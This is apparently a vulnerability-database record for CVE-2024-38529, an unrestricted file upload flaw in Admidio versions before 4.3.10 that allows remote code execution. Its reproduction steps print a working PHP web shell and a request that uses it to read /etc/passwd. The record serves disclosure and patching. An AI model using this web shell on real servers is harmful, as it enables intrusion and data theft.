{
  "Identifier": "CVE-2024-38529",
  "PackageSlug": "packagist/admidio/admidio",
  "Title": "Admidio Vulnerable to RCE via Arbitrary File Upload in Message Attachment",
  "Description": "### Description:\nRemote Code Execution Vulnerability has been identified in the Message module of the Admidio Application, where it is possible to upload a PHP file in the attachment. The uploaded file can be accessed publicly through the URL `{admidio_base_url}/adm_my_files/messages_attachments/{file_name}`.\n\nThe vulnerability is caused due to the lack of file extension verification, allowing malicious files to be uploaded to the server and public availability of the uploaded file.\n\nAn attacker can upload a PHP web shell that executes OS commands on the server, compromising the application server.\n\nNote: I am using the docker-compose.yaml file from https://github.com/Admidio/admidio/blob/master/README-Docker.md#docker-compose-usage official documentation.\n\n### Impact:\nAn attacker can exploit this flaw to upload a PHP web shell, which can be used to execute arbitrary commands on the server. This can lead to a complete compromise of the application server, allowing the attacker to:\n\n- Execute arbitrary code or commands.\n- Access, modify, or delete sensitive data.\n- Install malicious software or scripts.\n- Gain further access to internal networks.\n- Disrupt services and applications hosted on the server.\n\n### Recommendation:\n\n- Implement strict file extension verification to ensure that only allowed file types (e.g., images, documents) can be uploaded.\n- Reject any file upload with disallowed or suspicious extensions such as .php, .phtml, .exe, etc.\n\n### Steps to Reproduce:\n1. As a member user, go to write an email message.\n2. Upload a PHP file in the Attachment, containing the following content:\n```\n\u003c?php\n$command = isset($_GET['command']) ? $_GET['command'] : '';\n$output = [];\n$return_var = 0;\nexec($command, $output, $return_var);\necho '\u003ch1\u003eExploiting RCE\u003c/h1\u003e';\necho 'Command: '.$command;\necho '\\n\u003cpre\u003e';\necho implode(\"\\n\", $output);\necho '\u003c/pre\u003e';\n?\u003e\n```\n3. Send the email.\n4. In the message history go to the sent message.\n5. Download the file, to get the uploaded file name.\n6. Go to the following URL: \n`{admidio_base_url}/adm_my_files/messages_attachments/{file_name}?command=cat+/etc/passwd`\n7. The server's passwd file would be returned in the response.\n\n### Proof Of Concept:\n\n![image](https://github.com/Admidio/admidio/assets/59286712/51b524de-ec51-4875-80e9-e2037da9c573)\n\n_Figure 1: Code of messages_send.php, not having file extension verification._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/74b47e6d-e2e9-4535-82e3-d6ad2f677361)\n\n_Figure 2: Uploading Webshell as attachment._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/abea26eb-b36f-46db-9e3a-8a4ba82d9740)\n\n_Figure 3: Download the uploaded file to get the uploaded file name._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/fbb14aae-d5c6-454b-bafa-8d03d6d8a208)\n\n_Figure 4: Uploaded File name._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/f8436248-1768-4714-ad2d-87f157145c61)\n\n_Figure 5: RCE via web shell._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/edc5b992-227f-43f9-bef9-87959766a63c)\n\n_Figure 6: RCE via Webshell._",
  "Date": "2024-07-29",
  "Pubdate": "2024-07-29",
  "AffectedRange": "\u003c4.3.10",
  "FixedVersions": [
    "4.3.10"
  ],
  "AffectedVersions": "All versions before 4.3.10",
  "NotImpacted": "All versions starting from 4.3.10",
  "Solution": "Upgrade to version 4.3.10 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2024-38529",
    "https://github.com/advisories/GHSA-g872-jwwr-vggm",
    "https://github.com/Admidio/admidio/security/advisories/GHSA-g872-jwwr-vggm",
    "https://github.com/Admidio/admidio/commit/3b1cc1cda05747edebe15f2825b79bc5a673d94c",
    "https://github.com/Admidio/admidio"
  ],
  "CvssV2": "",
  "CvssV3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H",
  "UUID": "5635596a-85e6-4785-9a7c-7e31f92c2643"
}